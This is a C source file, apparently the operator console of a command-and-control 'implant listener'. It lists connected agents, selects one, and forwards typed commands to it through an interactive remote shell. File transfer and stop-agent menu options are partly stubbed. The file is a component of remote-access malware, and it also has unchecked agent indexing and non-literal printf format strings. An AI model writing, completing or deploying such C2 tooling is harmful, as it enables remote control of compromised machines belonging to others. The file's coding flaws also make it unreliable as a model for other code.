/*
console.c

This function is responsible for handling user input. It will select an agent to interact with.
It will pass commands to the message handler and receive responses from the message handler

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <poll.h>
#include <signal.h>
#include <stdbool.h>
#include <sys/types.h>

#include "utility.h"
#include "queue.h"
#include "implant.h"
#include "base.h"
#include "console.h"
#include "listener_handler.h"

// Global variables
// Receive Queue
extern Queue* listener_receive_queue;
extern pthread_mutex_t listener_receive_queue_lock;
// Send Queue
extern Queue* listener_send_queue;
extern pthread_mutex_t listener_send_queue_lock;
// SIGINT flag
extern volatile sig_atomic_t all_sigint;
extern volatile sig_atomic_t shell_sigint;
extern volatile sig_atomic_t shell_flag;

#define MENU "Provide an option.\n1 - list active agents\n2 - select active agent\n9 - exit\n"
#define AGENT_MENU "Implant %d selected.\nProvide an option.\n1 - interactive shell\n2 - put file\n3 - get file\n4 - stop agent\n5 - go back\n"

STATIC int shell_console(int agent_fd){
	int retval;
	char command_buf[FIRST_PAYLOAD_SIZE];
	char* buffer;
    fd_set console_fds;
    struct timeval tv;

	printf("Ctrl-c to restart shell\nexit to leave shell running");
	print_out("%s", "");

	shell_flag = true;
	while (!shell_sigint){

		tv.tv_sec = SELECT_TIMEOUT;
		tv.tv_usec = 0;
		FD_ZERO(&console_fds);
		FD_SET(STDIN, &console_fds);

		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
        if (retval == -1){
            printf("select error, shell_console\n");
			all_sigint = true;
			return RET_ERROR;
        }
		else if (FD_ISSET(STDIN, &console_fds)){
			memset(command_buf, 0, FIRST_PAYLOAD_SIZE);
			if (!fgets(command_buf, FIRST_PAYLOAD_SIZE, stdin)){
				printf("fgets error\n");
				all_sigint = true;
				return RET_ERROR;
			}

			buffer = malloc(FIRST_PAYLOAD_SIZE);
			memset(buffer, 0, FIRST_PAYLOAD_SIZE);
			memcpy(buffer, command_buf, FIRST_PAYLOAD_SIZE);

			listener_prepare_message(agent_fd, TYPE_COMMAND, buffer, strnlen(buffer, FIRST_PAYLOAD_SIZE));
			print_out("%s\n", "");
		}
	}
	shell_sigint = false;
	shell_flag = false;

	return RET_OK;
}

STATIC int put_file_command(){
	char buf[FIRST_PAYLOAD_SIZE];

	print_out("%s\n", "Source file");
	if (!fgets(buf, FIRST_PAYLOAD_SIZE, stdin)){
		printf("fgets error\n");
		all_sigint = true;
		return RET_ERROR;
	}
	if (access(buf, F_OK)){
		printf("File doesn't exist\n");
		return RET_OK;
	}
	print_out("%s\n", "Destination file (default is current directory)");
	if (!fgets(buf, FIRST_PAYLOAD_SIZE, stdin)){
		printf("fgets error\n");
		all_sigint = true;
		return RET_ERROR;
	}
	return RET_OK;
}

STATIC int agent_console(int agent_fd){
	int retval;
	char opt_buf[FIRST_PAYLOAD_SIZE];
	long option;
    fd_set console_fds;
    struct timeval tv;

	print_out(AGENT_MENU, agent_fd);
				 
	while(!all_sigint){
		tv.tv_sec = SELECT_TIMEOUT;
    	tv.tv_usec = 0;
    	FD_ZERO(&console_fds);
    	FD_SET(STDIN, &console_fds);

		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
        if (retval == -1){
            printf("select error, agent_console\n");
			all_sigint = true;
			return RET_ERROR;
        }
		else if (FD_ISSET(STDIN, &console_fds)){
			if (!fgets(opt_buf, FIRST_PAYLOAD_SIZE, stdin)){
				printf("fgets error\n");
				all_sigint = true;
				return RET_ERROR;
			}
			option = strtol(opt_buf, NULL, 10);
			switch(option){
				case 1:
					if (shell_console(agent_fd) != RET_OK){
						return RET_ERROR;
					}
					break;
				case 2:
					if (put_file_command() != RET_OK){
						return RET_ERROR;
					}
					break;
				case 3:
					break;
				case 4:
					break;
				case 5:
					return 0;
				default:
					print_out("%s\n", "Unknown option selected");
					break;
			}
			print_out(AGENT_MENU, agent_fd);
		}
	}
	
	return 0;
}


void *console_thread(void *vargp){
	Connected_Agents* CA = vargp;
	const char banner[] =	"   ___ _   _   ___ _   _   ________  _________ _       ___   _   _ _____ \n"
							"  |_  | | | | |_  | | | | |_   _|  \\/  || ___ \\ |     / _ \\ | \\ | |_   _|\n"
							"    | | | | |   | | | | |   | | | .  . || |_/ / |    / /_\\ \\|  \\| | | |  \n"
							"    | | | | |   | | | | |   | | | |\\/| ||  __/| |    |  _  || . ` | | |  \n"
							"/\\__/ / |_| /\\__/ / |_| |  _| |_| |  | || |   | |____| | | || |\\  | | |  \n"
							"\\____/ \\___/\\____/ \\___/   \\___/\\_|  |_/\\_|   \\_____/\\_| |_/\\_| \\_/ \\_/  \n";
	int retval;
	char buffer[FIRST_PAYLOAD_SIZE];
	long option;
    fd_set console_fds;
    struct timeval tv;
				 
	printf(banner);
	printf("\nWelcome to the implant listener.");
	
	print_out("%s", MENU);
	while(!all_sigint){
		
		tv.tv_sec = SELECT_TIMEOUT;
    	tv.tv_usec = 0;
    	FD_ZERO(&console_fds);
    	FD_SET(STDIN, &console_fds);

		retval = select(STDIN + 1, &console_fds, NULL, NULL, &tv);
        if (retval == -1){
            printf("select error, console_thread\n");
			all_sigint = true;
			break;
        }
		else if (FD_ISSET(STDIN, &console_fds)){
			if (!fgets(buffer, FIRST_PAYLOAD_SIZE, stdin)){
				printf("fgets error\n");
				all_sigint = true;
				break;
			}

			option = strtol(buffer, NULL, 10);
			switch(option){
				case 9:
					all_sigint = true;
					break;
				case 1:
					printf("\n%s\n", "Active Agents\n-------------");
					pthread_mutex_lock(&CA->lock);
					for (int i = 0; i < FDSIZE; i++){
						if (CA->agents[i].alive) printf(" %d\n", i);
					}
					printf("\n");
					pthread_mutex_unlock(&CA->lock);
					break;
				case 2:
					printf("Which agent?\n");
					fgets(buffer, FIRST_PAYLOAD_SIZE, stdin);
					option = strtol(buffer, NULL, 10);
					if (CA->agents[option].alive){
						agent_console(option);
					}
					else{
						printf("agent dead\n");
					}
					break;
				default:
					printf("Unknown option selected\n");
					break;
			}
			print_out("%s", MENU);
        }
	}

	debug_print("%s\n", "console_thread done");
	return 0;
}